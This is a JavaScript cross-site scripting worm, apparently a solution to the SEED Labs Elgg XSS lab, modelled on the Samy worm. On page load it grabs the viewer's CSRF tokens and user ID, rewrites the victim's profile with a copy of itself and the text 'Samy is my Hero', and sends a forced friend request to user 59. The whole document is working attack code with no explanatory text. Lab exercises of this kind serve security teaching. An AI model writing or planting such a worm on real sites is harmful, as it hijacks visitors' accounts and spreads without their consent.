<script id="worm">
window.onload = function() {
    let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
    let token = "&__elgg_token="+elgg.security.token.__elgg_token;
    let victimID = `&guid=${elgg.session.user.guid}`;
    let name = `&name=${elgg.session.user.name}`;
    let headerTag = "<script id =\"worm\" type=\"text/javascript\">";
    let strCode = document.getElementById("worm").innerHTML;
    let tailTag = "</" + "script>";
    let wormCode = encodeURIComponent(headerTag + strCode + tailTag);
    let description = "&description=Samy is my Hero" + wormCode + "&accesslevel[description]=2";
    let fields = "&briefdescription=&accesslevel[briefdescription]=2" + "&location=&accesslevel[location]=2" + "&interests=&accesslevel[interests]=2" + "&skills=&accesslevel[skills]=2" + "&contactemail=&accesslevel[contactemail]=2" + "&phone=&accesslevel[phone]=2" + "&mobile=&accesslevel[mobile]=2" + "&website=&accesslevel[website]=2" + "&twitter=&accesslevel[twitter]=2";
    let content = token + ts + name + description + fields + victimID;
    const SKIP_ID = 59;
    let sendUrl = "http://www.seed-server.com/action/profile/edit";
    if(elgg.session.user.guid  !==  SKIP_ID){
        let Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendUrl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
        let Ajax2 = new XMLHttpRequest();
        Ajax2.open("GET", `http://www.seed-server.com/action/friends/add?friend=${SKIP_ID}${ts}${token}`, true);
        Ajax2.send();

    }
}
</script>
